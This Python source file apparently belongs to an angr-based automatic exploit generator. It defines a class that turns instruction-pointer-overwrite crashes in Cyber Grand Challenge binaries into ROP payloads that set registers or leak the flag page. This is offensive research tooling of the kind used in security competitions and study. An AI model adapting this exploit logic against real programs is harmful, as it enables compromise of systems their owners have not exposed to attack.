import os
import angr

from rex import Vulnerability
from rex.exploit import Exploit
from rex.exploit.cgc.payload import CircumstantialSetter, ROPSetter, ShellcodeSetter, ROPLeaker

import logging
l = logging.getLogger("rex.exploit.Exploit")

class NonExploitableCrash(Exception):
    pass

class CannotExploit(Exception):
    pass

class CannotBypassNX(CannotExploit):
    pass

class ImproperCircumstances(CannotExploit):
    pass

class CGCExploit(Exploit):
    '''
    Exploit object which can leak flags or set registers
    '''

    REGISTERS = ["eax", "ecx", "edx", "ebx", "esp", "ebp", "esi", "edi"]

    def __init__(self, crash, use_rop_cache=True, rop_cache_file=None):
        '''
        :param crash: an exploitable crash object
        :param use_rop_cache: should rop gadgets be cached?
        :param rop_cache_file: which filename to use for a rop cache
        '''
        super(CGCExploit, self).__init__(crash, use_rop_cache, rop_cache_file)

        # dictionary of register keys to register setting exploit object
        self.exploits = { }

        # leaker exploit
        self.leaker = None

    def initialize(self):

        super(CGCExploit, self).initialize()

        self._generate_register_setters()
        self._generate_leaker()

    def set_register(self, reg, reg_val, final_ip):
        '''
        :param reg: register to set
        :param val: value to set
        :param final_ip: ip to set after setting the register
        :return: a payload which will set the register @reg to a value @val
        '''
        if reg not in self.exploits:
            raise NotImplementedError

        return self.exploits[reg].dumps(final_ip, reg_val)

    def leak_address(self, addr, length):
        '''
        :param addr: address of memory to leak
        :param length: number of bytes to leak at address
        :return: a payload which will leak length bytes at address addr
        '''

        if self.leaker is None:
            raise NotImplementedError

        return self.leaker.dumps(addr, length)

    def can_control(self, reg):
        '''
        :param reg: register we're interested if we control
        :return: True if we can produce an exploit whcih controls the register, False otherwise
        '''

        return reg in self.exploits

    def any_control(self):
        '''
        does this exploit offer anything?
        '''

        return self.leaker is not None or bool(len(self.exploits))

### EXPLOIT GENERATORS

    def _generate_leaker(self):
        '''
        generate and set the leaker exploit
        '''

        try:
            self.leaker = self._generate_a_leaker()
        except CannotExploit:
            l.warning("cannot generate a leaker exploit")

    def _generate_a_leaker(self):
        '''
        generate a leaker exploit
        '''

        try:
            return self._generate_rop_leaker()
        except CannotBypassNX:
            l.warning("unable to use rop to generate leaker")

        '''
        try:
            return self._generate_sc_leaker()
        except CannotReturnToShellcode:
            l.warning("unable to use shellcode to generate leaker")
        '''

        raise CannotExploit

    def _generate_register_setters(self):
        '''
        generate a register setter for eax, ecx, edx, ebx, esp, ebp, esi, edi
        '''

        for register in CGCExploit.REGISTERS:
            try:
                setter = self._generate_setter(register)
            except CannotExploit:
                l.warning("cannot generate register setting exploit for %s", register)
                continue

            self.exploits[register] = setter

    def _generate_setter(self, register):
        '''
        generate a register setter for a single register
        '''

        # first try rop setter, it's the most reliable probably
        try:
            return self._generate_rop_setter(register)
        except CannotBypassNX:
            l.warning("unable to use rop to generate exploit")

        # circumsantial setter is later, because we can't guarantee we set all values
        try:
            return self._generate_circumstantial_setter(register)
        except ImproperCircumstances:
            # we tried
            pass

        # TODO attempt to generate an exploit which uses shellcode
        '''
        try:
            return self._generate_sc_setter(register)
        except:
            l.warning("unable to use shellcode to generate exploit")
        '''

        raise CannotExploit

    def _generate_circumstantial_setter(self, register):
        '''
        generate an exploit if the circumstances are just right
        '''

        if self.crash.crash_type == Vulnerability.IP_OVERWRITE:

            reg = getattr(self.state.regs, register)

            size = reg.size()
            test_val_0 = 0x0
            test_val_1 = (1 << size) - 1
            test_val_2 = int("1010"*16, 2) % (1 << size)
            test_val_3 = int("0101"*16, 2) % (1 << size)

            if not self.state.satisfiable(extra_constraints=(reg == test_val_0,)):
                raise ImproperCircumstances
            if not self.state.satisfiable(extra_constraints=(reg == test_val_1,)):
                raise ImproperCircumstances
            if not self.state.satisfiable(extra_constraints=(reg == test_val_2,)):
                raise ImproperCircumstances
            if not self.state.satisfiable(extra_constraints=(reg == test_val_3,)):
                raise ImproperCircumstances

            return CircumstantialSetter(self.binary, register, self.state.copy())

        l.debug("crash's vulnerability type doesn't lend itself to circumstantial exploitation")
        raise ImproperCircumstances

    def _generate_rop_leaker(self):
        '''
        generate a rop exploit for performing a leak
        '''

        if self.crash.crash_type == Vulnerability.IP_OVERWRITE or self.crash.crash_type == Vulnerability.PARTIAL_IP_OVERWRITE:
            return self._eip_overwrite_rop_leaker()
        else:
            l.error("crash's vulnerability exploitation method is not exploitable yet")
            raise NotImplementedError

    def _generate_rop_setter(self, register):
        '''
        generate a setter exploit for a given register
        '''

        if self.crash.crash_type == Vulnerability.IP_OVERWRITE or self.crash.crash_type == Vulnerability.PARTIAL_IP_OVERWRITE:
            return self._eip_overwrite_rop_setter(register)
        else:
            l.error("crash's vulnerability exploitation method is not exploitable yet")
            raise NotImplementedError

    def _eip_overwrite_rop_leaker(self):
        '''
        generate a leaker exploit using rop
        '''

        # XXX TODO really all this should be offloaded to a rop gadget searcher which is state aware

        # we need control of eax, ebx, ecx, and edx
        need_control = ['eax', 'ebx', 'ecx', 'edx', 'esi']
        rop_uncontrolled = [ ]
        # any one of these we can't control with rop?
        for register in need_control:
            try:
                self.rop_engine.set_regs(**{register: 0x41414141})
            except angr.analyses.rop.RopException:
                l.debug("unable to set register %s with rop in leaker", register)
                rop_uncontrolled.append(register)

        # for those registers which are uncontrolled by rop, can we control it circumstantially?
        # XXX special circumstances for each register
        constraints = [ ]
        for register in rop_uncontrolled:
            # if it's eax we can't control with rop, make sure it can be 2
            if register == "eax":
                constraints.append(self.state.regs.eax == 2)
            # if it's ebx we need to make sure it can stdout
            if register == "ebx":
                constraints.append(self.state.regs.ebx == 1)
            # if it's ecx we need to make sure it's practically unconstrained
            if register == "ecx":
                # TODO worry about ecx
                l.warning("cannot control ecx with rop when generating leaker")
                raise CannotBypassNX
            # if it's edx, we need to be able to set it to 0x1000 bytes
            if register == "edx":
                constraints.append(self.state.regs.edx == 0x1000)
            # if it's esi, we need to point to NULL or a writable page
            # TODO support setting to a writable page
            if register == "esi":
                constraints.append(self.state.regs.esi == 0x0)

        if not self.state.satisfiable(extra_constraints=constraints):
            l.warning("circumstantial constraints generated were unsatisfactory for a rop leaker")
            raise CannotBypassNX

        CGC_ADDR = 0x4347c000
        chain = self.rop_engine.do_syscall(2, [1, CGC_ADDR, 0x1000, 0x0], ignore_registers=rop_uncontrolled)

        exploit_state, chain_addr, offered_size = self._eip_overwrite_with_chain(chain)

        return ROPLeaker(self.binary, exploit_state, chain_addr, offered_size, rop_uncontrolled, self.rop_engine)

    def _eip_overwrite_rop_setter(self, register):
        '''
        generate a setter exploit using rop
        '''

        try:
            # set to a dummy value, the setter will generate this dynamically
            # we assume that other values won't change the size of the chain
            chain = self.rop_engine.set_regs(**{register: 0x41414141})
        except angr.analyses.rop.RopException:
            l.warning("no rop chains which set the register %s", register)
            raise CannotBypassNX

        exploit_state, chain_addr, offered_size = self._eip_overwrite_with_chain(chain)

        return ROPSetter(self.binary, register, exploit_state, chain_addr, offered_size, self.rop_engine)
